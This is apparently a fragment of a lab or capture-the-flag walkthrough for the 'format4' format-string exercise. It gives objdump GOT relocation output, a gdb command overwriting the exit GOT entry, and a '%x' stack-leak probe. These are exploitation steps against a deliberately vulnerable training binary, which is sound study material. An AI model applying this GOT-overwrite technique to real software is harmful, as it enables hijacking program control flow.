```bash
objdump -TR format4 

format4:     file format elf32-i386

DYNAMIC SYMBOL TABLE:
00000000  w   D  *UND*	00000000              __gmon_start__
00000000      DF *UND*	00000000  GLIBC_2.0   fgets
00000000      DF *UND*	00000000  GLIBC_2.0   __libc_start_main
00000000      DF *UND*	00000000  GLIBC_2.0   _exit
00000000      DF *UND*	00000000  GLIBC_2.0   printf
00000000      DF *UND*	00000000  GLIBC_2.0   puts
00000000      DF *UND*	00000000  GLIBC_2.0   exit
080485ec g    DO .rodata	00000004  Base        _IO_stdin_used
08049730 g    DO .bss	00000004  GLIBC_2.0   stdin


DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
080496fc R_386_GLOB_DAT    __gmon_start__
08049730 R_386_COPY        stdin
0804970c R_386_JUMP_SLOT   __gmon_start__
08049710 R_386_JUMP_SLOT   fgets
08049714 R_386_JUMP_SLOT   __libc_start_main
08049718 R_386_JUMP_SLOT   _exit
0804971c R_386_JUMP_SLOT   printf
08049720 R_386_JUMP_SLOT   puts
08049724 R_386_JUMP_SLOT   exit
```

(gdb) set {int}0x8049724=0x80484b4

```bash
./format4 
AAAA %x %x %x %x
AAAA 200 b7fd8420 bffff614 41414141
```
